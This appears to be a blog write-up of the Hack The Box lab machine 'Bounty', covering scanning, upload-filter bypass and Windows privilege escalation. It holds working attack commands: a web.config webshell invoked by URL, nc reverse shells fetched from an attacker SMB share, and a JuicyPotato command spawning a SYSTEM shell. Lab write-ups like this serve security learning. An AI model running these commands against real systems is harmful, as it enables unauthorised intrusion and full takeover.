---
title: Hack The Box - Bounty (Without Metasploit)
date: 2021-01-17 03:44:00 +0800
categories: [hackthebox]
tags: [windows, juicypotato]
image:
    path: /assets/images/bounty.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.93 bounty.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a bounty.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.93:80
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 16:25 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Initiating Connect Scan at 16:25
Scanning bounty.htb (10.10.10.93) [1 port]
Discovered open port 80/tcp on 10.10.10.93
Completed Connect Scan at 16:25, 0.01s elapsed (1 total ports)
Initiating Service scan at 16:25
Scanning 1 service on bounty.htb (10.10.10.93)
Completed Service scan at 16:25, 6.16s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.93.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Nmap scan report for bounty.htb (10.10.10.93)
Host is up, received user-set (0.0080s latency).
Scanned at 2021-01-16 16:25:08 UTC for 6s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
```

# Enumeration (1)

## Port 80 `Microsoft IIS httpd 7.5`

![](/assets/images/bounty1.png)

We see a wizard? Nothing much here. Directory browsing show a page and 2 directories.

```bash
$ gobuster dir -k -u http://bounty.htb/ -w /usr/share/wordlists/dirb/big.txt  -t 100 -x .txt,.
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bounty.htb/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     xml,asp,aspx,txt
[+] Timeout:        10s
===============================================================
2021/01/16 11:26:04 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/transfer.aspx (Status: 200)
/uploadedfiles (Status: 301)
===============================================================
2021/01/16 11:26:26 Finished
===============================================================
```

`transfer.aspx` seems interesting, so lets check it out first.

![](/assets/images/bounty2.png)

I tried uploading files of various extensions such as `asp`, `txt`, `aspx` etc but only found out that image related extensions such as `png`, `jpeg` or `gif` were accepted, or that was what I thought at the start. For those files that were successfully uploaded, they become availabe in `/uploadedfiles`.

I tried double extensions (e.g shell.asp.jpeg) and null byte but it all didn't work.  It was until I came across this [article](https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/#section1_1). 

# Exploitation (1)

When I tried uploading the `web.config` provided by the article, all I got was an error:

![](/assets/images/bounty3.png)

This was proof that the `web.config` was being executed! I decided to lookup for some `web.config` webshells and found [one](https://raw.githubusercontent.com/tennc/webshell/master/aspx/web.config) that worked for me.


After uploading, if we browse to `http://bounty.htb/uploadedfiles/web.config?cmd=whoami`, we see that we can run commands as `merlin`.

![](/assets/images/bounty4.png)

Now, to upgrade to a better shell. We can start a `SMB` server with `smbserver.py` that shares a `nc.exe` and start a `nc` listener on our machine.

```bash
$ mkdir share
$ cd share
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . 
[sudo] password for kali: 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

Then, on our browser, we browse to `http://bounty.htb/uploadedfiles/web.config?cmd=\\10.10.XX.XX\kali\nc.exe -e cmd.exe 10.10.XX.XX 1337`. We will then receive a shell as `merlin`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.X] from (UNKNOWN) [10.10.10.93] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
C:\tmp> bounty\merlin
```

# user.txt

The user flag is in `merlin`'s Desktop.

```
C:\tmp> type C:\Users\merlin\Desktop\user.txt
bdffXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

Checking our current privileges, we see that we have the `SeAssignPrimaryTokenPrivilege` and `SeImpersonatePrivilege` privileges. 

```
C:\tmp> whoami /priv                                                                                     
                                                                                                 
PRIVILEGES INFORMATION                                                                           
----------------------                                                                           
                                                                                                 
Privilege Name                Description                               State                    
============================= ========================================= ========                 
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                 
SeAuditPrivilege              Generate security audits                  Disabled                 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled                  
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                 
                                                                                                 
```

This means we can run the [`Juicy Potato`](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) exploit!

# Exploitation (2)

Note that we will need to have another `nc` listener. 

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

Now, after transferring a copy of `juicypotato.exe` and a `nc.exe`, we just need to run the following command.

```
C:\tmp> juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\tmp\nc.exe -e cmd.exe 10.10.XX.XX 1337" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

And finally, on our listener, we get a shel as `SYSTEM`!

```
$ rlwrap nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.93] 49464
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
whoami
nt authority\system
```

# root.txt

The root flag is in `Administrator`'s Desktop.

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
9359XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !